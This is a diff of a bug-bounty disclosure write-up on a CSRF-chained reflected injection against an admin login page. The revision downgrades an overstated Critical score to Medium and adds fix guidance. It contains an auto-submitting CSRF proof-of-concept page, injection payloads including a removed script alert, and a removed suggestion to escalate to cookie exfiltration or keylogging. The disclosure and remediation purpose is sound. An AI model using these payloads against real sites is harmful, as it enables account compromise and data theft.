@@ -1,167 +1,88 @@
-# CVE-Class: Chained CSRF → Reflected XSS on Admin Login Panel
+# Chained CSRF → Reflected HTML/Markup Injection on an Admin Login Panel
 
-**Program:** Private Bug Bounty Program (Telecom Provider)  
-**Vulnerability Class:** Reflected Cross-Site Scripting (XSS) via Cross-Site Request Forgery (CSRF)  
-**Endpoint Type:** Admin CMS Login Page (`/admin/login/index.php`)  
-**OWASP 2021:** A3 – Injection  
-**CVSS v3.1 Score:** 9.3 (Critical)  
-**Status:** Hall of Fame — Accepted & Rewarded  
-**Discovery Date:** Q1 2025
+**Program:** Fastweb S.p.A. — Responsible Disclosure Programme (public Hall of Fame, 2025)
+**Report:** RD-0001622
+**Vulnerability class:** CSRF-delivered reflected injection — OWASP 2021 A3 (Injection)
+**Endpoint type:** Admin CMS login page (POST)
+**CVSS v3.1:** 6.1 (Medium) — `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
+**Status:** Accepted — Hall of Fame recognition
+**Discovery:** Q1 2025
 
----
+> **Scoring note.** I first submitted this at 9.3 (Critical). That was wrong, and I'm leaving the correction visible rather than quietly restating it. My PoC demonstrated that unsanitized attacker HTML — an anchor element and a heading — was reflected and rendered. I did **not** demonstrate script execution, and the injection point is a **pre-authentication** login page, so there was no established session to compromise. Medium is the honest rating. Full reasoning in the portfolio scoring note.
 
 ## TL;DR
+The admin login form carried no CSRF protection and reflected the `username` field into the response unsanitized. Chained, a reflection that is normally Self-only becomes a one-click, attacker-deliverable reflected injection against the login page, with no attacker authentication. What the PoC proves is unsanitized reflection of attacker-controlled HTML; full script execution was not demonstrated, which is why this is Medium rather than the Critical I originally claimed.
 
-The admin panel login form for a large European telecom provider lacked CSRF protections and reflected user input unsanitized in server responses. By chaining these two weaknesses, I escalated a Self-XSS (normally unexploitable) into a fully weaponized Reflected XSS deliverable via a single link — with no authentication required from the attacker.
+## Root cause
+Two independent weaknesses:
 
----
+1. **Missing CSRF token** — no server-side check that a POST originated from the legitimate login page, so any external page could submit the form on a visitor's behalf.
+2. **Unsanitized reflection** — the `username` value was reflected verbatim into the response body with no HTML encoding, so injected markup rendered in the browser.
 
-## Vulnerability Details
+On a pre-auth login page neither is impactful alone. Chained, they make the reflection remotely deliverable with a single click.
 
-| Field | Value |
-|---|---|
-| Endpoint Type | Admin CMS Login (`POST`) |
-| Vulnerable Parameter | `username` field (dynamically named) |
-| Authentication Required | None |
-| User Interaction | One click on attacker-crafted link |
-| Scope | Admin panel of production web application |
-
-### Root Cause
-
-Two independent weaknesses combined:
-
-1. **Missing CSRF token** — The login form had no server-side mechanism to verify that a POST submission originated from the legitimate login page. Any page on the internet could submit the form on a visitor's behalf.
-
-2. **Unsanitized reflection** — The value supplied in the `username` field was reflected verbatim in the HTTP response body without HTML encoding, allowing injected markup and script to execute in the browser.
-
-Individually, neither issue achieves full exploitability. Together, they create a one-click critical.
-
----
-
-## CVSS v3.1 Breakdown
-
+## CVSS v3.1 breakdown
 | Metric | Value | Rationale |
 |---|---|---|
-| Attack Vector (AV) | Network | Fully remote, no physical access |
-| Attack Complexity (AC) | Low | No race conditions or special preconditions |
-| Privileges Required (PR) | None | Attacker needs no account |
-| User Interaction (UI) | Required | Victim must click one link |
-| Scope (S) | **Changed** | XSS crosses from attacker's origin into target's origin |
-| Confidentiality (C) | High | Session tokens, admin cookies accessible |
-| Integrity (I) | High | Full page control; admin actions possible |
-| Availability (A) | None | No DoS component |
-| **Base Score** | **9.3 — Critical** | |
+| Attack Vector | Network | Remote, no local access |
+| Attack Complexity | Low | No special preconditions |
+| Privileges Required | None | Attacker needs no account |
+| User Interaction | Required | Victim clicks one link |
+| Scope | Changed | Injected content renders under the target's origin |
+| Confidentiality | Low | Reflected content in the victim's browser; no demonstrated data access |
+| Integrity | Low | Page-content manipulation; no demonstrated backend impact |
+| Availability | None | No availability impact |
+| **Base score** | **6.1 — Medium** | |
 
-> Scope: Changed is the key driver here. Because the XSS executes under the target domain's origin, it breaks the browser's same-origin boundary — meaning the impact extends beyond what the attacker directly controls.
+Why not the 9.3 I first submitted: I originally set `S:C/C:H/I:H` on the theory that an admin-origin XSS yields session and admin-action compromise. But the PoC rendered an anchor tag and a heading — HTML injection, not demonstrated script execution — and the injection point is the pre-auth login page, so there is no admin session there to steal. Scoring the theoretical ceiling of the bug class instead of the demonstrated impact is exactly the error I have since corrected across my reports.
 
----
-
-## Attack Chain
-
+## Attack chain
 ```
-[Attacker]
-    │
-    │  1. Hosts malicious HTML page with auto-submitting form
-    │     containing XSS payload in username field
-    │
-    ▼
-[Victim visits attacker's page]
-    │
-    │  2. Browser auto-POSTs forged request to target admin login
-    │     (no CSRF token to block it)
-    │
-    ▼
-[Target Server]
-    │
-    │  3. Reflects username value into response HTML
-    │     without sanitization
-    │
-    ▼
-[Victim's Browser]
-    │
-    │  4. Injected script executes under target's origin
-    │
-    ▼
-[Attacker achieves XSS on target.com]
+[Attacker] hosts an auto-submitting form carrying the injection payload
+      │
+      ▼
+[Victim opens the page] → browser auto-POSTs the forged request
+      │  (no CSRF token to block it)
+      ▼
+[Target] reflects the username value into the response unencoded
+      │
+      ▼
+[Victim's browser] renders the injected markup under the target's origin
 ```
 
----
+## Reproduction (redacted)
+Target domain and the dynamically generated field name are redacted.
 
-## Reproduction Steps
+**Step 1 — Confirm no CSRF protection.** The login form accepts a cross-origin POST with a `username` parameter; no token is present or validated.
 
-> **Note:** Domain and application-specific identifiers have been redacted. The `[TARGET]` placeholder represents the affected admin panel origin.
-
-**Step 1.** Identify the login form endpoint and observe that it accepts a POST with a `username` parameter. Note that no CSRF token is present in the form or validated server-side.
-
-**Step 2.** Confirm the reflection. Submit the following value in the `username` field via a direct POST:
+**Step 2 — Confirm the reflection.** POST the `username` value:
 ```
-test123"><h1>INJECTED</h1>
+test"><a href="https://example.com">link</a><h1>injected</h1>
 ```
-If the string `<h1>INJECTED</h1>` appears rendered in the response, unsanitized reflection is confirmed.
+If the anchor and heading render in the response, unsanitized reflection is confirmed. This is what the accepted PoC demonstrated.
 
-**Step 3.** Craft the CSRF exploit page. Save the following as `poc.html` and host it on any HTTP server:
-
+**Step 3 — CSRF delivery page.** Save as `poc.html` and host it:
 ```html
 <!DOCTYPE html>
-<html>
-<head><title>PoC</title></head>
-<body>
+<html><body>
   <form action="https://[TARGET]/admin/login/" method="POST" id="f">
     <input type="hidden" name="username_fieldname" value="username_[RANDOMIZED]">
     <input type="hidden" name="username_[RANDOMIZED]"
-           value='"><script>alert(document.domain)</script>'>
+           value='"><a href="https://example.com">link</a><h1>injected</h1>'>
   </form>
   <script>document.getElementById('f').submit();</script>
-</body>
-</html>
+</body></html>
 ```
 
-**Step 4.** Send the URL of `poc.html` to a victim. When they open it, the form submits automatically, the XSS payload is reflected, and `alert(document.domain)` fires on the target's origin — confirming execution.
+**Step 4 — Deliver.** Send the URL to a victim. On load the form auto-submits and the injected markup renders on the target's origin.
 
-**Step 5.** Replace the `alert()` with any JavaScript payload (e.g., cookie exfiltration, keylogger, redirect to phishing page).
+**On escalation:** replacing the markup with a script payload is the theoretical next step. I did not demonstrate script execution in the accepted PoC, so I do not claim it — a reviewer should treat script execution as unverified until shown.
 
----
+## Fix recommendations
+1. **CSRF tokens (primary).** Per-session, cryptographically random, validated on every POST; reject missing/invalid with 403.
+2. **Output encoding (primary).** Context-appropriate HTML encoding of every reflected value (`<`→`&lt;`, `>`→`&gt;`, `"`→`&quot;`, `'`→`&#x27;`, `&`→`&amp;`) via a tested library, not manual replacement.
+3. **SameSite cookies.** `SameSite=Strict` or `Lax` on session cookies as a second line against CSRF.
+4. **Content-Security-Policy.** A strict nonce-based CSP would break the escalation path even if reflection persists.
 
-## Observed Response (Redacted)
-
-The server returned HTTP 200 with the injected content rendered inline in the HTML body, confirming reflection without sanitization. Response headers included no `Content-Security-Policy`.
-
----
-
-## Fix Recommendations
-
-### 1. CSRF Token Implementation (Primary Fix)
-Generate a cryptographically random, per-session token server-side and include it as a hidden field in every form. Validate it on every POST — reject requests missing a valid token with a 403.
-
-```html
-<input type="hidden" name="csrf_token" value="[SERVER_GENERATED_TOKEN]">
-```
-
-### 2. Output Encoding (Primary Fix)
-All user-supplied values reflected in HTML responses must be encoded using context-appropriate escaping. In an HTML context, at minimum encode:
-
-| Character | Encoded Form |
-|---|---|
-| `<` | `&lt;` |
-| `>` | `&gt;` |
-| `"` | `&quot;` |
-| `'` | `&#x27;` |
-| `&` | `&amp;` |
-
-Use a well-tested sanitization library rather than manual replacement.
-
-### 3. SameSite Cookie Attribute
-Set `SameSite=Strict` or `SameSite=Lax` on all session cookies. This acts as a second line of defense against CSRF even when tokens are absent.
-
-### 4. Content Security Policy
-Deploy a `Content-Security-Policy` header restricting script sources. A strict CSP (e.g., nonce-based) would have broken this chain even with the XSS present.
-
-```
-Content-Security-Policy: default-src 'self'; script-src 'nonce-{RANDOM}'
-```
-
----
-
-## Key Takeaway
-
-This finding demonstrates a common pattern in web security: **two low-to-medium severity issues combining into a critical**. Neither CSRF on a login form nor Self-XSS is typically accepted by most programs in isolation. Recognizing that CSRF is the delivery mechanism that promotes Self-XSS to Reflected XSS is what elevated this to Hall of Fame.
+## Key takeaway
+Two weaknesses programs routinely reject in isolation — CSRF on a login form, and a reflection that on its own is Self-only — combine into a remotely deliverable reflected injection. That composition is the finding. The second lesson is the scoring: I first called this Critical, and it isn't. A severity rating is only worth what it can be trusted at, and the honest number here is Medium.
